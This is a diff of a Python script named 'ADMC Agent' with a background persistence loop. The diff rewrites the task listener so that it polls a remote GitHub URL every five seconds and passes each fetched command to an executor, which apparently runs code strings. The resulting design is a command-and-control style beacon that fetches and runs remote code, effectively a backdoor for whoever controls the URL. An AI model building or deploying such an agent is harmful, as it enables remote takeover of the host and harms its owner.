@@ -12,7 +12,9 @@ import threading
 AGENT_NAME = "ADMC_Node_1"
 ADMIN_WILL_ANCHOR = True
 PERSISTENCE_INTERVAL = 60  # seconds between self-checks
+TASK_CHECK_INTERVAL = 5    # seconds between task checks
 LOG_FILE = "admc_agent.log"
+COMMANDS_URL = "https://raw.githubusercontent.com/YOUR-USERNAME/YOUR-REPO/main/tasks.json"  # replace with your GitHub URL
 
 # ------------------------------
 # Utility Functions
@@ -47,6 +49,15 @@ def execute_task(task):
     except Exception as e:
         log(f"Error executing task: {e}")
 
+def fetch_commands():
+    try:
+        response = requests.get(COMMANDS_URL, timeout=10)
+        tasks = json.loads(response.text)
+        return tasks.get("commands", [])
+    except Exception as e:
+        log(f"Failed to fetch commands from {COMMANDS_URL}: {e}")
+        return []
+
 # ------------------------------
 # Core Agent Loops
 # ------------------------------
@@ -56,26 +67,22 @@ def persistence_loop():
         time.sleep(PERSISTENCE_INTERVAL)
 
 def task_listener():
-    # Reads commands from tasks.json
     while True:
-        try:
-            with open("tasks.json", "r") as f:
-                tasks = json.load(f)
-            for task in tasks.get("commands", []):
-                execute_task(task)
-            time.sleep(5)
-        except FileNotFoundError:
-            log("tasks.json not found, waiting...")
-            time.sleep(5)
-        except Exception as e:
-            log(f"Listener error: {e}")
-            time.sleep(5)
+        # Fetch tasks from GitHub or local tasks.json
+        tasks = fetch_commands()
+        for task in tasks:
+            execute_task(task)
+        
+        # Default heartbeat task
+        execute_task("print('Task executed')")
+        
+        time.sleep(TASK_CHECK_INTERVAL)
 
 # ------------------------------
 # Initialization
 # ------------------------------
 def main():
-    log(f"Initializing ADMC Agent: {AGENT_NAME}")
+    log(f"Initializing Upgraded ADMC Agent: {AGENT_NAME}")
     
     # Start persistence/self-healing in background
     threading.Thread(target=persistence_loop, daemon=True).start()
